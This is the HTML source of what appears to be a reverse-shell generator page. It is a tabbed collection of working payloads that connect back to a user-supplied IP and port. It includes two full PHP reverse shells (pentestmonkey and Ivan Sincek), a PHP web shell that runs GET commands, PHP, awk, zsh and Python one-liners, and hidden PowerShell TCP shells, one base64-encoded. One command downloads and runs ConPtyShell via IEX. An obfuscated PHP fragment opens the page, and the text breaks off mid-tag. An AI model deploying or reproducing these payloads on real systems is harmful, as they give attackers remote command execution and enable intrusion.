    <p>;$ð="p";$ð¤="s";$ð="x";$ð = $ð. $ð¤.</p>
    <p>$ð. $ð. $ð. $ð. $ð. $ð. </p>
    <p>$ð;$ð = </p>
    
      <div id="mydiv">
    <p>"</p>
     <p id="ip thirty seven"></p>
       <p>"</p>
       <p> ;$ð» =</p> &nbsp
       <p id="port thirty seven"></p>
     <p>;$ð = "</p>
     
    <div class="fifteen"> </div>
     
     <p>". $ð¤</p>
     </div>
     
     <p>¢. $ð±. $ð¤©. $ð¤¢. $ð¤. $ðµ. $ð. $ð¤¢. </p>
     <p>$ð¤ . $ðµ. $ð. $ð¤¢. $ð. $ð¤ . $ðµ. $ð</p>
     <p>;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. </p>
     <p>$ð. $ð;$ð½($ð);'</p>
    </p>
</div>
</div>





<div id="PHPpentest" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <p>
    
   <p> &lt?php</p>
<p>// php-reverse-shell - A Reverse Shell implementation in PHP.</p> <p>Comments stripped to slim it down. RE:</p> <p>https://raw.githubusercontent.com/pentestmonkey/php-reverse- shell/master/php-reverse-shell.php</p>
<p>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</p>

<p>set_time_limit (0);</p>
<p>$VERSION = "1.0";</p>

  <div id="mydiv">
$ip = '</p>
<p id="ip thirty eight"></p>
';
</div>


  <div id="mydiv">
$port =
<p id="port thirty eight"></p>
;
</div>

<p>$chunk_size = 1400;</p>
<p>$write_a = null;</p>
<p>$error_a = null;</p>
<p>$shell = 'uname -a; w; id;&nbsp</p>
 <div class="sixteen"> </div>

<p>&nbsp -i';</p>
<p>$daemon = 0;</p>
<p>$debug = 0;</p>

<p>if (function_exists('pcntl_fork')) {</p>
    <p>$pid = pcntl_fork();</p>
    
    <p>if ($pid == -1) {</p>
    <p>    printit("ERROR: Can't fork");</p>
    <p>    exit(1);</p>
<p>    }</p>
    
    <p>if ($pid) {</p>
<p>        exit(0);  // Parent exits</p>
<p>    }</p>
<p>    if (posix_setsid() == -1) {</p>
    <p>    printit("Error: Can't setsid()");</p>
        <p>exit(1);</p>
<p>    }</p>

    <p>$daemon = 1;</p>
<p>} else {</p>
<p>    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");</p>
<p>}</p>

<p>chdir("/");</p>

<p>umask(0);</p>

<p>// Open reverse connection</p>
<p>$sock = fsockopen($ip, $port, $errno, $errstr, 30);</p>
<p>if (!$sock) {</p>
<p>    printit("$errstr ($errno)");</p>
<p>    exit(1);</p>
<p>}</p>

<p>$descriptorspec = array(</p>
 <p>  0 => array("pipe", "r"),  // stdin is a pipe that the child will read from</p>
<p>   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to</p>
<p>   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);</p>

<p>$process = proc_open($shell, $descriptorspec, $pipes);
</p>
<p>if (!is_resource($process)) {</p>
    <p>printit("ERROR: Can't spawn shell");</p>
    <p>exit(1);</p>
<p>}</p>

<p>stream_set_blocking($pipes[0], 0);</p>
<p>stream_set_blocking($pipes[1], 0);</p>
<p>stream_set_blocking($pipes[2], 0);</p>
<p>stream_set_blocking($sock, 0);</p>

<p>printit("Successfully opened reverse shell to $ip:$port");</p>

<p>while (1) {</p>
<p>    if (feof($sock)) {</p>
<p>        printit("ERROR: Shell connection terminated");</p>
<p>        break;</p>
<p>    }</p>

<p>    if (feof($pipes[1])) {</p>
<p>        printit("ERROR: Shell process terminated");</p>
<p>        break;</p>
<p>    }</p>

<p>    $read_a = array($sock, $pipes[1], $pipes[2]);</p>
<p>    $num_changed_sockets = stream_select($read_a, $write_a,</p> <p>$error_a, null);</p>

    <p>if (in_array($sock, $read_a)) {</p>
    <p>    if ($debug) printit("SOCK READ");</p>
    <p>    $input = fread($sock, $chunk_size);</p>
    <p>    if ($debug) printit("SOCK: $input");</p>
    <p>    fwrite($pipes[0], $input);</p>
    <p>}</p>

    <p>if (in_array($pipes[1], $read_a)) {</p>
    <p>    if ($debug) printit("STDOUT READ");</p>
    <p>    $input = fread($pipes[1], $chunk_size);</p>
    <p>    if ($debug) printit("STDOUT: $input");</p>
    <p>    fwrite($sock, $input);</p>
    <p>}</p>

    <p>if (in_array($pipes[2], $read_a)) {</p>
    <p>    if ($debug) printit("STDERR READ");</p>
    <p>    $input = fread($pipes[2], $chunk_size);</p>
    <p>    if ($debug) printit("STDERR: $input");</p>
    <p>    fwrite($sock, $input);</p>
    <p>}</p>
<p>}</p>

<p>fclose($sock);</p>
<p>fclose($pipes[0]);</p>
<p>fclose($pipes[1]);</p>
<p>fclose($pipes[2]);</p>
<p>proc_close($process);</p>

<p>function printit ($string) {</p>
<p>    if (!$daemon) {</p>
<p>        print "$string\n";</p>
<p>    }</p>
<p>}</p>

<p>?></p>

    
    </p>
    
     
</div>
</div>




<div id="PHPivan" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <p>
    
    <p>&lt?php</p>
<p>// Copyright (c) 2020 Ivan Sincek  </p>
<p>// v2.3  </p>
<p>// Requires PHP v5.0.0 or greater.  </p>
<p>// Works on Linux OS, macOS, and Windows OS.  </p>
<p>// See the original script at <p>https://github.com/pentestmonkey/php-reverse-shell.  </p>
<p>class Shell {  </p>
  <p>  private $addr  = null;  </p>
  <p>  private $port  = null;  </p>
  <p>  private $os    = null;  </p>
   <p> private $shell = null;  </p>
   <p> private $descriptorspec = array(  </p>
   <p>     0 => array('pipe', 'r'), // shell can read from STDIN  </p>
    <p>    1 => array('pipe', 'w'), // shell can write to STDOUT  </p>
    <p>    2 => array('pipe', 'w')  // shell can write to STDERR  </p>
  <p>  );  </p>
  <p>  private $buffer  = 1024;    // read/write buffer size  </p>
  <p>  private $clen    = 0;       // command length  </p>
  <p>  private $error   = false;   // stream read/write error  </p>
  <p>  public function __construct($addr, $port) {  </p>
     <p>   $this->addr = $addr;  </p>
        <p>$this->port = $port;  </p>
 <p>   }  </p>
 <p>   private function detect() {  </p>
 <p>      $detected = true;  </p>
  <p>      if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS  </p>
    <p>        $this->os    = 'LINUX';  </p>
    
     <div id="mydiv">
    
     <p>       $this->shell = '</p>
       <div class="seventeen"> </div>
    <p> ';  </p>
     
     
     </div>
      <p>  } else if (stripos(PHP_OS, 'WIN32') !== false ||  </p> <p>stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !==  </p>
      <p>false) {  </p>
  <p>          $this->os    = 'WINDOWS';  </p>
  <p>          $this->shell = 'cmd.exe';  </p>
   <p>     } else {  </p>
   <p>         $detected = false;  </p>
   <p>         echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";  </p>
    <p>    }  </p>
    <p>    return $detected;  </p>
   <p> }  </p>
   <p> private function daemonize() {  </p>
    <p>    $exit = false;  </p>
   <p>     if (!function_exists('pcntl_fork')) {  </p>
    <p>        echo "DAEMONIZE: pcntl_fork() does not exists, moving <p>on...\n";  </p>
     <p>   } else if (($pid = @pcntl_fork()) &lt 0) {  </p>
    <p>      echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";</p>
       <p> } else if ($pid > 0) {  </p>
          <p>  $exit = true;  </p>
         <p>   echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";  </p>
       <p> } else if (posix_setsid() &lt 0) {  </p>
       <p>     // once daemonized you will actually no longer see the script's dump  </p>
        <p>    echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";  </p>
    <p>    } else {  </p>
    <p>        echo "DAEMONIZE: Completed successfully!\n";  </p>
    <p>    }  </p>
      <p>  return $exit;  </p>
   <p> }  </p>
  <p>  private function settings() {  </p>
  <p>      @error_reporting(0);  </p>
  <p>      @set_time_limit(0); // do not impose the script execution time limit  </p>
   <p>     @umask(0); // set the file/directory permissions - 666 for files and 777 for directories  </p>
   <p> }  </p>
   <p> private function dump($data) {  </p>
   <p>     $data = str_replace('&lt', '&amp lt;', $data);  </p>
   <p>     $data = str_replace('>', '&amp gt;', $data);  </p>
   <p>     echo $data;  </p>
   <p> }  </p>
   <p> private function read($stream, $name, $buffer) {  </p>
   <p>     if (($data = @fread($stream, $buffer)) === false) { // suppress <p>an error when reading from a closed blocking stream  </p>
    <p>        $this->error = true;                            // set global error flag  </p>
   <p>         echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";  </p>
     <p>   }  </p>
     <p>   return $data;  </p>
   <p> }  </p>
   <p> private function write($stream, $name, $data) {  </p>
   <p>     if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream  </p>
    <p>        $this->error = true;                            // set global error flag  </p>
      <p>      echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";  </p>
       <p> }  </p>
      <p>  return $bytes;  </p>
   <p> }  </p>
   <p> // read/write method for non-blocking streams  </p>
  <p>  private function rw($input, $output, $iname, $oname) {  </p>
  <p>      while (($data = $this->read($input, $iname, $this->buffer)) &&
    </p>
  <p>$this->write($output, $oname, $data)) {  </p>
    <p>        if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this-  </p>
    <p>>clen += strlen($data); } // calculate the command length  </p>
      <p>      $this->dump($data); // script's dump  </p>
     <p>   }  </p>
   <p> }  </p>
   <p> // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)  </p>
  <p>  // we must read the exact byte length from a stream and not a single byte more  </p>
  <p>  private function brw($input, $output, $iname, $oname) {  </p>
  <p>      $fstat = fstat($input);  </p>
   <p>     $size = $fstat['size'];  </p>
   <p>     if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {  </p>
        <p>    // for some reason Windows OS pipes STDIN into STDOUT  </p>
       <p>     // we do not like that  </p>
       <p>     // we need to discard the data from the stream  </p>
       <p>     while ($this->clen > 0 && ($bytes = $this->clen >= $this-  </p>
       <p>>buffer ? $this->buffer : $this->clen) && $this->read($input, $iname,  </p>
       <p>$bytes)) {  </p>
   <p>             $this->clen -= $bytes;  </p>
    <p>            $size -= $bytes;  </p>
     <p>       }  </p>
     <p>   }  </p>
     <p>   while ($size > 0 && ($bytes = $size >= $this->buffer ? $this-  </p>
     <p>>buffer : $size) && ($data = $this->read($input, $iname, $bytes)) &&  </p>
     <p>$this->write($output, $oname, $data)) {  </p>
     <p>       $size -= $bytes;  </p>
     <p>       $this->dump($data); // script's dump  </p>
     <p>   }  </p>
  <p>  }  </p>
   <p> public function run() {  </p>
   <p>     if ($this->detect() && !$this->daemonize()) {  </p>
    <p>        $this->settings();  </p>

      <p>      // ----- SOCKET BEGIN -----  </p>
        <p>    $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);  </p>
        <p>    if (!$socket) {  </p>
        <p>        echo "SOC_ERROR: {$errno}: {$errstr}\n";  </p>
        <p>    } else {  </p>
          <p>      stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS  </p>

          <p>      // ----- SHELL BEGIN -----  </p>
           <p>     $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);  </p>
            <p>    if (!$process) {  </p>
            <p>        echo "PROC_ERROR: Cannot start the shell\n";  </p>
            <p>    } else {  </p>
            <p>        foreach ($pipes as $pipe) {  </p>
            <p>            stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS  </p>
              <p>      }  </p>

              <p>      // ----- WORK BEGIN -----  </p>
               <p>     $status = proc_get_status($process);  </p>
               <p>     @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");  </p>
                 <p>   do {  </p>
                <p><p>        $status = proc_get_status($process);  </p>
                 <p>       if (feof($socket)) { // check for end-of-file on SOCKET  </p>
                  <p>          echo "SOC_ERROR: Shell connection has been terminated\n"; break;  </p>
                  <p>      } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running  </p>
                   <p>         echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams  </p>
                   <p>     }                                </p>                                  <p>    // use proc_get_status() instead  </p>
                <p>        $streams = array(  </p>
                  <p>          'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR  </p>
             <p>               'write'  => null,  </p>
             <p>               'except' => null  </p>
             <p>           );  </p>
              <p>          $num_changed_streams =  </p> <p>@stream_select($streams['read'], $streams['write'], $streams['except'],  </p>
              <p>0); // wait for stream changes | will not wait on Windows OS  </p>
                    <p>    if ($num_changed_streams === false) {  </p>
                     <p>       echo "STRM_ERROR: stream_select() failed\n"; break;  </p>
                     <p>   } else if ($num_changed_streams > 0) {  </p>
                     <p>       if ($this->os === 'LINUX') {  </p>
                      <p>          if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN  </p>
                     <p>           if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET  </p>
                    <p>            if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET  </p>
                     <p>       } else if ($this->os === 'WINDOWS') {  </p>
                     <p>           // order is important  </p>
                     <p>           if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN  </p>
                              <p>  if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET  </p>
                             <p>   if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET  </p>
                       <p>     }  </p>
                      <p>  }  </p>
                 <p>   } while (!$this->error);  </p>
                 <p>   // ------ WORK END ------  </p>

                 <p>   foreach ($pipes as $pipe) {  </p>
                  <p>      fclose($pipe);  </p>
                 <p>   }  </p>
                <p>    proc_close($process);  </p>
               <p> }  </p>
              <p>  // ------ SHELL END ------  </p>

             <p>   fclose($socket);  </p>
           <p> }  </p>
          <p>  // ------ SOCKET END ------  </p>

       <p> }  </p>
   <p> }  </p>
<p>}  </p>
<p>echo '&amp ltpre>';  </p>
<p>// change the host address and/or port number as necessary  </p>

  <div id="mydiv">
<p>$sh = new Shell('</p>
<p id="ip thirty nine"></p>

<p>',&nbsp</p>
<p id="port thirty nine"></p>
<p>);  </p>

</div>

<p>$sh->run();  </p>
<p>unset($sh);  </p>
<p>// garbage collector requires PHP v5.3.0 or greater  </p>
<p>// @gc_collect_cycles();  </p>
<p>echo '&amp lt/pre>';  </p>
<p>?>  </p>
    
    
    
    </p>
  
     
</div>
</div>





<div id="PHPcmd" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <p>
    
   <p> &lt html></p>
<p> &lt body></p>
<p> &lt form method="GET" name="&lt?php echo basename($_SERVER['PHP_SELF']); ?>"> </p>

<p> &lt input type="TEXT" name="cmd" id="cmd" size="80"></p>
<p> &lt input type="SUBMIT" value="Execute"></p>
<p> &lt/form></p>
<p> &lt pre></p>
<p> &lt?php</p>
 <p>   if(isset($_GET['cmd']))</p>
<p>    {</p>
    <p>    system($_GET['cmd']);</p>
 <p>   }</p>
<p>?></p>

<p> &lt/pre></p>
<p> &lt/body></p>
<p> &lt script>document.getElementById("cmd").focus();&lt/script></p>
<p> &lt/html> </p>
    
    
    </p>
    
</div>
</div>





<div id="PHPexec" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  
  <div id="mydiv">
    <p>
    
    php -r '$sock=fsockopen("</p>
    <p id="ip fourty"></p>
   <p> ",</p>

<p id="port fourty"></p>
   <p>);exec("</p>
   
    <div class="eighteen"> </div>
    
   <p>&nbsp &lt&3 >&amp3 2>&amp3");'</p>
    </p>
    </div>
   
     
</div>
</div>





<div id="PHPshellexec" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <div id="mydiv">
    <p>
    
    php -r '$sock=fsockopen("</p>
    <p id="ip fourty one"></p>
   <p> ",</p>

<p id="port fourty one"></p>
   <p>);shell_exec("</p>
   
    <div class="nineteen"> </div>
    
   <p>&nbsp &lt&3 >&amp3 2>&amp3");'</p>
    </p>
    </div>
   
     
</div>
</div>






<div id="PHPsys" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
   <div id="mydiv">
    <p>
    
    php -r '$sock=fsockopen("</p>
    <p id="ip fourty two"></p>
   <p> ",</p>

<p id="port fourty two"></p>
   <p>);system("</p>
   
    <div class="twenty"> </div>
    
   <p>&nbsp &lt&3 >&amp3 2>&amp3");'</p>
    </p>
    </div>
   
     
</div>
</div>






<div id="PHPpassthru" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
   <div id="mydiv">
    <p>
    
    php -r '$sock=fsockopen("</p>
    <p id="ip fourty three"></p>
   <p> ",</p>

<p id="port fourty three"></p>
   <p>);passthru("</p>
   
    <div class="twentyone"> </div>
    
   <p>&nbsp &lt&3 >&amp3 2>&amp3");'</p>
    </p>
    </div>
   
     
</div>
</div>






<div id="PHP" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
   <div id="mydiv">
    <p>
    php -r '$sock=fsockopen("</p>
        <p id="ip fourty four"></p>
    <p>",&nbsp</p>
    <p id="port fourty four"></p>
    <p>);`&nbsp</p>
    <div class="twentytwo"> </div>
    <p> &nbsp&lt&3 >&3 2>&3`;'
    </p>
 
     </div>
</div>
</div>




<div id="PHPpopen" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
     <div id="mydiv">
    <p>
    php -r '$sock=fsockopen("</p>
       <p id="ip fourty five"></p>
     <p>",</p>
    <p id="port fourty five"></p>
    
   <p> );popen("</p>
    
    
    <div class="twentythree"> </div>
    <p> &nbsp&lt&3 >&3 2>&3", "r");'</p>
    
    </p>
    </div>
     
     
</div>
</div>




<div id="PHPproc" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
     <div id="mydiv">
    <p>
    php -r '$sock=fsockopen("</p>
     <p id="ip fourty six"></p>
     <p>",</p>
    <p id="port fourty six"></p>
    
   <p> );$proc=proc_open("</p>
    <div class="twentyfour"> </div>
   
   <p>", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
    
    
    
    </p>
 
     </div>
</div>
</div>





<div id="windowsconpty" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
     <div id="mydiv">
    <p>
    
    
    IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell&nbsp</p>
      <p id="ip fourty seven"></p>
     <p>&nbsp</p>
       <p id="port fourty seven"></p>
 
    </p>
     
     
</div>
</div>
</div>





<div id="Awk" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
   <div id="mydiv">
    <p>
    awk 'BEGIN {s = "/inet/tcp/0/</p>
     <p id="ip fourty eight"></p>
   <p> /</p>
    
     <p id="port fourty eight"></p>
    <p>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
    
    
    </p>
  </div>
     
</div>
</div>




<div id="power1" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <div id="mydiv">
    <p>
    
    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("</p>
      <p id="ip fourty nine"></p>
     <p>",</p>
    <p id="port fourty nine"></p>
    
   <p>  );$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
    
    </p>
 
     </div>
</div>
</div>




<div id="power2" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
      <div id="mydiv">
    <p>
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('</p>
    <p id="ip fifty"></p>
     <p>',</p>
    <p id="port fifty"></p>
    
  <p>  );$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    
    </p>
  </div>
</div>
</div>






<div id="power3" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  
      <div id="mydiv">
    <p>
    
    powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('</p>
     <p id="ip fifty one"></p>
     <p>',</p>
    <p id="port fifty one"></p>
    
    
    
   <p> );$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&amp1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
    </p>
 
     
</div>

</div>
</div>





<div id="power4" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
   <div id="mydiv">
    <p>
    powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('</p>
    
     <p id="ip fifty two"></p>
     <p>',</p>
    <p id="port fifty two"></p>
    
    
  <p>  );$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&amp1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
    
    
    </p>
    
     
</div>
</div>
</div>





<div id="power364" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
     
    
   <p> powershell -e</p>
  
   <p> JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAG</p>
   <p>UAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsA</p>
   <p>ZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAOQAiACwAOQ</p>
  <p> AwADAAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABp</p>
  <p> AGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAH</p>
  <p> kAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYA</p>
  <p> NQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQ</p>
  <p> AgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5</p>
  <p> AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAG</p>
  <p> cAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEA</p>
  <p> IAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcA</p>
   <p>BlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBB</p>
   <p>AFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAH</p>
   <p>QAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkA</p>
   <p>OwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJA</p>
   <p>BkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdABy</p>
   <p>AGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9AC</p>
   <p>AAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAA</p>
   <p>KwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIg</p>
   <p>A7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0</p>
   <p>AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC</p>
   <p>4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsA</p>
   <p>MgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcw</p>
   <p>BlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABl</p>
   <p>AC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAG</p>
   <p>wAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsA</p>
   <p>G8AcwBlACgAKQA=</p>
    
    
   
    
     
 
</div>
</div>






<div id="zsh" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  
  <div id="mydiv">
    <p>
    
    zsh -c 'zmodload zsh/net/tcp && ztcp </p>
    <p>&nbsp</p>
    <p id="ip fifty three"></p>
     <p>&nbsp</p>
       <p id="port fifty three"></p>
       <p>&nbsp</p>
    <p>&& zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
    
    </p>
    
     </div>
</div>
</div>




<div id="py1" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  
    <div id="mydiv">
    <p>
    
    export RHOST="</p>
    <p id="ip fifty four"></p>
    
   <p> ";export RPORT=</p>
    
       <p id="port fifty four"></p>
   <p> ;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("</p>
    
     <div class="twentyfive"> </div>
    
  <p>  ")'
    
    </p>
     
     </div>
</div>
</div>


<div id="py2" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  <div id="mydiv">
    <p>
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</p>
    
     <p id="ip fifty five"></p>
     <p>",</p>
    <p id="port fifty five"></p>
    
  <p>  ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("</p>
  
   <div class="twentysix"> </div>
 <p>  ")'</p>
  
    
    
  </div>
     
</div>
</div>


<div id="py31" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  <div id="mydiv">
    <p>
    export RHOST="</p>
    
     <p id="ip fifty six"></p>
    
    <p>";export RPORT=</p>
    
    <p id="port fifty five"></p>
    <p>;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("</p>
    
      <div class="twentyseven"> </div>
   <p> ")'</p>
    
    
    
     
    
   </div>
</div>
</div>

 

<div id="py32" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  <div id="mydiv">
    <p>
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</p>
    
